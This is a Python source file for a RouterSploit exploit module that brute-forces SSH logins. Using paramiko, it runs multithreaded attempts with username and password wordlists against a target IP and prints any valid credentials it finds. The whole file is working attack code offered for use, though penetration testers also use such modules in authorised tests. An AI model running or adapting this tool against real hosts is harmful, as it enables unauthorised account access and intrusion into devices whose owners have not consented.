import threading
import itertools
import socket
import paramiko

from routersploit import *


class Exploit(exploits.Exploit):
    """
    Module performs bruteforce attack against SSH service.
    If valid credentials are found, they are displayed to the user.
    """
    __info__ = {
        'name': 'SSH Bruteforce',
        'author': 'Marcin Bury <marcin.bury[at]reverse-shell.com>' # routersploit module
    }

    target = exploits.Option('', 'Target IP address')
    port = exploits.Option(22, 'Target port')

    threads = exploits.Option(8, 'Number of threads')
    usernames = exploits.Option('admin', 'Username or file with usernames (file://)')
    passwords = exploits.Option(wordlists.passwords, 'Password or file with passwords (file://)')

    credentials = []

    def run(self):
        self.credentials = []
        print_status("Running module...")
        ssh = paramiko.SSHClient()

        try:
            ssh.connect(self.target, port=self.port)
        except socket.error:
            # print_error("Connection error: %s:%s" % (self.target, str(self.port)))
            ssh.close()
            return
        except:
            pass

        ssh.close()

        if self.usernames.startswith('file://'):
            usernames = open(self.usernames[7:], 'r')
        else:
            usernames = [self.usernames]

        if self.passwords.startswith('file://'):
            passwords = open(self.passwords[7:], 'r')
        else:
            passwords = [self.passwords]

        collection = LockedIterator(itertools.product(usernames, passwords))
        self.run_threads(self.threads, self.target_function, collection)

        if len(self.credentials):
            print_success("Credentials found!")
            headers = ("Login", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")
            
    def target_function(self, running, data):
        name = threading.current_thread().name
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        print_status(name, 'thread is starting...')

        while running.is_set():
            try:
                user, password = data.next()
                user = user.strip()
                password = password.strip()
                ssh.connect(self.target, int(self.port), timeout=5, username=user, password=password)
            except StopIteration:
                break
            except paramiko.ssh_exception.SSHException as err:
                ssh.close()
                # print_error(name, err, user, password)
            else:
                running.clear()
                print_success("{}: Authentication succeed!".format(name), user, password)
                self.credentials.append((user, password))

        print_status(name, 'thread is terminated.')
